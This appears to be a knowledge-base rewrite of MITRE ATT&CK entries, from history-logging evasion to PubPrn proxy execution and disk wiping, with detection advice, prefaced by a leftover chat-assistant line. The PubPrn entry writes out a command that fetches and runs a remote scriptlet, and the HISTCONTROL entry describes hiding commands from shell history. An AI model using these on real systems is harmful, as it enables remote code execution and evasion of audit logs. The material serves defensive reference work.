Certainly! Below is the optimized and refined version of the provided text, organized for clarity, coherence, and professionalism:

---

### HISTCONTROL Environment Variable

**Description:**
The `HISTCONTROL` environment variable controls which commands are saved by the history command and eventually into the `~/.bash_history` file when a user logs out. This setting can be configured to ignore commands that start with a space by setting it to `"ignorespace"`. Additionally, `HISTCONTROL` can be set to ignore duplicate commands by setting it to `"ignoredups"`. In some Linux systems, this is set by default to `"ignoreboth"`, which covers both scenarios. For example, a command like `" ls"` (with a leading space) will not be saved, but `ls` (without a leading space) will be saved. While `HISTCONTROL` does not exist by default on macOS, users can set it, and it will be respected.

**Adversary Use:**
Adversaries can use this feature to operate without leaving traces by simply prepending a space to all of their terminal commands.

**External References:**
- [MITRE ATT&CK T1148](https://attack.mitre.org/techniques/T1148)
- [CAPEC-13](https://capec.mitre.org/data/definitions/13.html)

**Kill Chain Phases:**
- **Defense Evasion**

**Detection:**
- Correlate user sessions with a distinct lack of new commands in their `.bash_history`.
- Monitor for changes to the `HISTCONTROL` environment variable, as this is suspicious behavior.

**Domains:**
- Enterprise Attack

**Permissions Required:**
- User

**Platforms:**
- Linux
- macOS

**Version:**
- 1.1

---

### Gather Victim Host Information

**Description:**
Adversaries may gather information about the victim's hosts for targeting purposes. This information can include administrative data (e.g., name, assigned IP, functionality) and configuration details (e.g., operating system, language).

**Collection Methods:**
- Direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).
- Compromising sites to include malicious content designed to collect host information from visitors.
- Accessing online or other accessible data sets (e.g., [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).

**Purpose:**
Gathering this information may reveal opportunities for other forms of reconnaissance, establishing operational resources, and/or initial access.

**External References:**
- [MITRE ATT&CK T1592](https://attack.mitre.org/techniques/T1592)
- [ScanBox](https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks)
- [ThreatConnect Infrastructure Research and Hunting](https://threatconnect.com/blog/infrastructure-research-hunting/)

**Kill Chain Phases:**
- **Reconnaissance**

**Detection:**
- Use internet scanners to look for patterns associated with malicious content designed to collect host information from visitors.
- Focus detection efforts on related stages of the adversary lifecycle, such as during Initial Access.

**Domains:**
- Enterprise Attack

**Platforms:**
- PRE

**Version:**
- 1.1

---

### Digital Certificates

**Description:**
Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates, issued by a Certificate Authority (CA), contain information about the registered organization, such as name and location.

**Adversary Actions:**
- Use online resources and lookup tools to harvest information about certificates.
- Extract information from artifacts signed by the organization, such as certificates used in encrypted web traffic.

**Purpose:**
This information may reveal opportunities for other forms of reconnaissance, establishing operational resources, and/or initial access.

**External References:**
- [MITRE ATT&CK T1596.003](https://attack.mitre.org/techniques/T1596/003)
- [SSL Shopper Lookup](https://www.sslshopper.com/ssl-checker.html)
- [Medium SSL Cert](https://medium.com/@menakajain/export-download-ssl-certificate-from-server-site-url-bcfc41ea46a2)

**Kill Chain Phases:**
- **Reconnaissance**

**Detection:**
- Focus detection efforts on related stages of the adversary lifecycle, such as during Initial Access.

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- True

**Platforms:**
- PRE

**Version:**
- 1.0

---

### Keylogging

**Description:**
Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is often used to acquire credentials when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) is not effective and may require intercepting keystrokes over a substantial period.

**Methods:**
- Hooking API callbacks used for processing keystrokes.
- Reading raw keystroke data from the hardware buffer.
- Windows Registry modifications.
- Custom drivers.
- [Modify System Image](https://attack.mitre.org/techniques/T1601) to read raw keystrokes for login sessions on network devices.

**External References:**
- [MITRE ATT&CK T1056.001](https://attack.mitre.org/techniques/T1056/001)
- [The Adventures of a Keystroke](http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf)
- [Cisco Blog Legacy Device Attacks](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)

**Kill Chain Phases:**
- **Collection**
- **Credential Access**

**Detection:**
- Monitor for common keylogging API calls, such as `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.
- Look for changes in the Registry and file system, driver installs, and unusual processes.

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- True

**Permissions Required:**
- Administrator
- root
- SYSTEM
- User

**Platforms:**
- Windows
- macOS
- Linux
- Network

**Version:**
- 1.1

---

### Linux and Mac File and Directory Permissions Modification

**Description:**
Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner or users with appropriate permissions.

**Commands:**
- `chown` (change owner)
- `chmod` (change mode)

**Adversary Use:**
- Modify file and directory ACLs to make themselves the owner or change the mode if current permissions allow it.
- Lock others out of the file.
- Establish persistence or taint/hijack other instrumental binary/configuration files.

**External References:**
- [MITRE ATT&CK T1222.002](https://attack.mitre.org/techniques/T1222/002)
- [Hybrid Analysis Icacls1 June 2018](https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100)
- [Hybrid Analysis Icacls2 May 2018](https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110)
- [20 Common Tools & Techniques Used by macOS Threat Actors & Malware](https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/)

**Kill Chain Phases:**
- **Defense Evasion**

**Detection:**
- Monitor and investigate attempts to modify ACLs and file/directory ownership.
- Enable file/directory permission change auditing on folders containing key binary/configuration files.

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- True

**Permissions Required:**
- User
- root

**Platforms:**
- macOS
- Linux

**Version:**
- 1.1

---

### Password Guessing

**Description:**
Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. This can be done using a repetitive or iterative mechanism, often with a list of common passwords.

**Risks:**
- Can cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.

**Targeted Services:**
- SSH (22/TCP)
- Telnet (23/TCP)
- FTP (21/TCP)
- NetBIOS / SMB / Samba (139/TCP & 445/TCP)
- LDAP (389/TCP)
- Kerberos (88/TCP)
- RDP / Terminal Services (3389/TCP)
- HTTP/HTTP Management Services (80/TCP & 443/TCP)
- MSSQL (1433/TCP)
- Oracle (1521/TCP)
- MySQL (3306/TCP)
- VNC (5900/TCP)
- SNMP (161/UDP and 162/TCP/UDP)

**Additional Targets:**
- Single sign-on (SSO) and cloud-based applications.
- Externally facing email applications.
- Network device interfaces (e.g., `wlanAPI`).

**External References:**
- [MITRE ATT&CK T1110.001](https://attack.mitre.org/techniques/T1110/001)
- [Trend Micro Emotet 2020](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/emotet-now-spreads-via-wi-fi)
- [Cylance Cleaver](https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf)
- [US-CERT TA18-068A 2018](https://www.us-cert.gov/ncas/alerts/TA18-086A)

**Kill Chain Phases:**
- **Credential Access**

**Detection:**
- Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078).
- If authentication failures are high, there may be a brute force attempt to gain access to a system using legitimate credentials.

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- True

**Platforms:**
- Windows
- Azure AD
- Office 365
- SaaS
- IaaS
- Linux
- macOS
- Google Workspace
- Containers
- Network

**Version:**
- 1.4

---

### PubPrn

**Description:**
Adversaries may use `PubPrn.vbs` to proxy execution of malicious remote files. `PubPrn.vbs` is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is commonly executed through the Windows Command Shell via `Cscript.exe`.

**Adversary Use:**
- Abuse `PubPrn` to execute malicious payloads hosted on remote sites.
- Set the second script parameter to reference a scriptlet file (.sct) hosted on a remote site.
- Example command: `pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct`.

**Prevention:**
- In later versions of Windows (10+), `PubPrn.vbs` has been updated to prevent proxying execution from a remote site by limiting the protocol specified in the second parameter to `LDAP://`.

**External References:**
- [MITRE ATT&CK T1216.001](https://attack.mitre.org/techniques/T1216/001)
- [Microsoft pubprn](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn)
- [Enigma0x3 PubPrn Bypass](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)

**Kill Chain Phases:**
- **Defense Evasion**

**Detection:**
- Monitor script processes, such as `cscript`, and command-line parameters for scripts like `PubPrn.vbs` that may be used to proxy execution of malicious files.

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- True

**Platforms:**
- Windows

**Version:**
- 2.0

---

### Purchase Technical Data

**Description:**
Adversaries may purchase technical information about victims that can be used during targeting. This information may be available for purchase within reputable private sources and databases, or less-reputable sources such as dark web or cybercrime black markets.

**Adversary Use:**
- Gather various technical details, including employee contact information, credentials, or specifics regarding a victim’s infrastructure.
- Use purchased data to discover opportunities for successful breaches.

**External References:**
- [MITRE ATT&CK T1597.002](https://attack.mitre.org/techniques/T1597/002)
- [ZDNET Selling Data](https://www.zdnet.com/article/a-hacker-group-is-selling-more-than-73-million-user-records-on-the-dark-web/)

**Kill Chain Phases:**
- **Reconnaissance**

**Detection:**
- Focus detection efforts on related stages of the adversary lifecycle, such as during Initial Access.

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- True

**Platforms:**
- PRE

**Version:**
- 1.0

---

### OS Credential Dumping

**Description:**
Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.

**Tools:**
- Several tools mentioned in associated sub-techniques can be used by both adversaries and professional security testers.

**External References:**
- [MITRE ATT&CK T1003](https://attack.mitre.org/techniques/T1003)
- [Medium Detecting Attempts to Steal Passwords from Memory](https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea)
- [PowerSploit](https://github.com/mattifestation/PowerSploit)
- [Microsoft DRSR Dec 2017](https://msdn.microsoft.com/library/cc228086.aspx)
- [Microsoft GetNCCChanges](https://msdn.microsoft.com/library/dd207691.aspx)
- [Samba DRSUAPI](https://wiki.samba.org/index.php/DRSUAPI)
- [Harmj0y DCSync Sept 2015](http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/)
- [Microsoft NRPC Dec 2017](https://msdn.microsoft.com/library/cc237008.aspx)
- [Microsoft SAMR](https://msdn.microsoft.com/library/cc245496.aspx)
- [AdSecurity DCSync Sept 2015](https://adsecurity.org/?p=1729)

**Kill Chain Phases:**
- **Credential Access**

**Detection:**
- Monitor for unexpected processes interacting with `lsass.exe`.
- Monitor for hash dumping activities, such as opening the Security Accounts Manager (SAM) on the local file system.
- Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- False

**Permissions Required:**
- Administrator
- SYSTEM
- root

**Platforms:**
- Windows
- Linux
- macOS

**Version:**
- 2.1

---

### Shared Modules

**Description:**
Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows Native API, called from functions like `CreateProcess`, `LoadLibrary`, etc. of the Win32 API.

**Loading Methods:**
- Via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory.
- Via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension).
- Via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs.
- Via `<file name="filename.extension" loadFrom="fully-qualified or relative pathname">` in an embedded or external "application manifest". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.

**Adversary Use:**
- Execute share modules to load additional components or features.

**External References:**
- [MITRE ATT&CK T1129](https://attack.mitre.org/techniques/T1129)
- [Wikipedia Windows Library Files](https://en.wikipedia.org/wiki/Microsoft_Windows_library_files)

**Kill Chain Phases:**
- **Execution**

**Detection:**
- Monitor DLL module loads and correlate with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk.
- Limit DLL module loads to `%SystemRoot%` and `%ProgramFiles%` directories to protect against module loads from unsafe paths.

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- False

**Platforms:**
- Windows

**Version:**
- 2.1

---

### Data from Configuration Repository

**Description:**
Adversaries may collect data related to managed devices from configuration repositories. These repositories are used by management systems to configure, manage, and control data on remote systems. They may also facilitate remote access and administration of devices.

**Adversary Use:**
- Target these repositories to collect large quantities of sensitive system administration data.
- Data from configuration repositories can store a wide variety of data, much of which may align with adversary Discovery objectives.

**External References:**
- [MITRE ATT&CK T1602](https://attack.mitre.org/techniques/T1602)
- [Cisco Advisory SNMP v3 Authentication Vulnerabilities](https://tools.cisco.com/security/center/content/CiscoAppliedMitigationBulletin/cisco-amb-20080610-SNMPv3)
- [US-CERT TA17-156A SNMP Abuse 2017](https://us-cert.cisa.gov/ncas/alerts/TA17-156A)
- [US-CERT-TA18-106A](https://www.us-cert.gov/ncas/alerts/TA18-106A)

**Kill Chain Phases:**
- **Collection**

**Detection:**
- Identify network traffic sent or received by untrusted hosts or networks that solicits and obtains the configuration information of the queried device.

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- False

**Platforms:**
- Network

**Version:**
- 1.0

---

### Disk Structure Wipe

**Description:**
Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system, targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources.

**Adversary Actions:**
- Overwrite critical data located in structures such as the master boot record (MBR) or partition table.
- On network devices, reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.

**Purpose:**
- Render the system unable to boot, leaving the computer unavailable.
- Maximize impact on the target organization by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).

**External References:**
- [MITRE ATT&CK T1561.002](https://attack.mitre.org/techniques/T1561/002)
- [Cisco format_cmd_cisco](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/F_through_K.html#wp2829794668)
- [Unit 42 Shamoon3 2018](https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/)
- [Palo Alto Shamoon Nov 2016](http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/)
- [FireEye Shamoon Nov 2016](https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html)
- [Kaspersky StoneDrill 2017](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf)
- [Symantec Shamoon 2012](https://www.symantec.com/connect/blogs/shamoon-attacks)

**Kill Chain Phases:**
- **Impact**

**Detection:**
- Look for attempts to read/write to sensitive locations like the master boot record and the disk partition table.
- Monitor for direct access read/write attempts using the `\\.\` notation.
- Monitor for unusual kernel driver installation activity.
- For network infrastructure devices, collect AAA logging to monitor for `format` commands being run to erase the file structure and prevent recovery of the device.

**Domains:**
- Enterprise Attack

**Impact Type:**
- Availability

**Is Subtechnique:**
- True

**Platforms:**
- Linux
- macOS
- Windows
- Network

**Version:**
- 1.1

---

### Direct Network Flood

**Description:**
Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may reduce the availability and functionality of the targeted system(s) and network. [Direct Network Floods](https://attack.mitre.org/techniques/T1498/001) are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Stateless protocols such as UDP or ICMP are commonly used, but stateful protocols such as TCP can be used as well.

**Adversary Use:**
- Botnets are commonly used to conduct network flooding attacks against networks and services.
- Adversaries may build their own botnet infrastructure or rent time on an existing botnet to conduct an attack.

**External References:**
- [MITRE ATT&CK T1498.001](https://attack.mitre.org/techniques/T1498/001)
- [Cisco DoSdetectNetflow](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf)
- [USNYAG IranianBotnet March 2016](https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged)

**Kill Chain Phases:**
- **Impact**

**Detection:**
- Detection of a network flood can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service.
- Use typical network throughput monitoring tools such as netflow, SNMP, and custom scripts to detect sudden increases in network or service utilization.
- Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol.

**Domains:**
- Enterprise Attack

**Impact Type:**
- Availability

**Is Subtechnique:**
- True

**Platforms:**
- Windows
- Azure AD
- Office 365
- SaaS
- IaaS
- Linux
- macOS
- Google Workspace

**Version:**
- 1.3

---

### Stored Data Manipulation

**Description:**
Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

**Types of Data:**
- A variety of file formats, such as Office files, databases, stored emails, and custom file formats.
- The type of modification and the impact it will have depends on the type of data and the goals and objectives of the adversary.

**External References:**
- [MITRE ATT&CK T1492](https://attack.mitre.org/techniques/T1492)
- [FireEye APT38 Oct 2018](https://content.fireeye.com/apt/rpt-apt38)
- [DOJ Lazarus Sony 2018](https://www.justice.gov/opa/press-release/file/1092091/download)

**Kill Chain Phases:**
- **Impact**

**Detection:**
- Inspect important file hashes, locations, and modifications for suspicious/unexpected values.

**Domains:**
- Enterprise Attack

**Impact Type:**
- Integrity

**Is Subtechnique:**
- False

**Permissions Required:**
- User
- Administrator
- root
- SYSTEM

**Platforms:**
- Linux
- macOS
- Windows

**Version:**
- 1.0

---

### Path Interception by PATH Environment Variable

**Description:**
Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the `PATH` environment variable, which Windows will then execute when it searches sequentially through that `PATH` listing in search of the binary that was called from a script or the command line.

**Example:**
- If `C:\example path` precedes `C:\Windows\system32` in the `PATH` environment variable, a program that is named `net.exe` and placed in `C:\example path` will be called instead of the Windows system `net` when `net` is executed from the command-line.

**External References:**
- [MITRE ATT&CK T1574.007](https://attack.mitre.org/techniques/T1574/007)

**Kill Chain Phases:**
- **Persistence**
- **Privilege Escalation**
- **Defense Evasion**

**Detection:**
- Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable.
- Monitor the executing process for process executable paths that are named for partial directories.
- Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as `findstr`, `net`, and `python`).

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- True

**Platforms:**
- Windows

**Version:**
- 1.0

---

### SharePoint

**Description:**
Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint often contains useful information for an adversary to learn about the structure and functionality of the internal network and systems. Examples of valuable information that may be found on SharePoint include:
- Policies, procedures, and standards
- Physical/logical network diagrams
- System architecture diagrams
- Technical system documentation
- Testing/development credentials
- Work/project schedules
- Source code snippets
- Links to network shares and other internal resources

**External References:**
- [MITRE ATT&CK T1213.002](https://attack.mitre.org/techniques/T1213/002)
- [Microsoft SharePoint Logging](https://support.office.com/en-us/article/configure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2)

**Kill Chain Phases:**
- **Collection**

**Detection:**
- Configure user access logging within Microsoft's SharePoint to report access to certain pages and documents.
- Closely monitor and alert on access to information repositories performed by privileged users.
- Monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository.
- Leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user-based anomalies.

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- True

**Permissions Required:**
- User

**Platforms:**
- Windows
- Office 365

**Version:**
- 1.0

---

### Direct Volume Access

**Description:**
Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools.

**Utilities:**
- Utilities, such as NinjaCopy, exist to perform these actions in PowerShell.

**External References:**
- [MITRE ATT&CK T1006](https://attack.mitre.org/techniques/T1006)
- [Hakobyan 2009](http://www.codeproject.com/Articles/32169/FDump-Dumping-File-Sectors-Directly-from-Disk-usin)
- [Github PowerSploit Ninjacopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)

**Kill Chain Phases:**
- **Defense Evasion**

**Detection:**
- Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives.
- Monitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections.
- Additional logging of PowerShell scripts is recommended.

**Domains:**
- Enterprise Attack

**Is Subtechnique:**
- False

**Permissions Required:**
- Administrator

**Platforms:**
- Windows

**Version:**
- 2.0

---

### File System Permissions Weakness

**Description:**
Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

**Adversary Use:**
- Replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level.
- Gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

**Variations:**
- **Services:** Replace a legitimate service executable with a malicious one.
- **Executable Installers:** Take advantage of a weakness in executable, self-extracting installers to overwrite binaries used in the installation process.

**External References:**
- [MITRE ATT&CK T1044](https://attack.mitre.org/techniques/T1044)
- [CAPEC-17](https://capec.mitre.org/data/definitions/17.html)
- [Mozilla Firefox Installer DLL Hijack](https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/)
- [Seclists Kanthak 7zip Installer](http://seclists.org/fulldisclosure/2015/Dec/34)

**Kill Chain Phases:**
- **Persistence**
- **Privilege Escalation**

**Detection:**
- Look for changes to binaries and service executables that may normally occur during software updates.
- Hashing of binaries and service executables could be used to detect replacement against historical data.
- Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.

**Domains:**
- Enterprise Attack

**Effective Permissions:**
- SYSTEM
- User
- Administrator

**Is Subtechnique:**
- False

**Permissions Required:**
- Administrator
- User

**Platforms:**
- Windows
- Linux
- macOS

**Version:**
- 1.1

---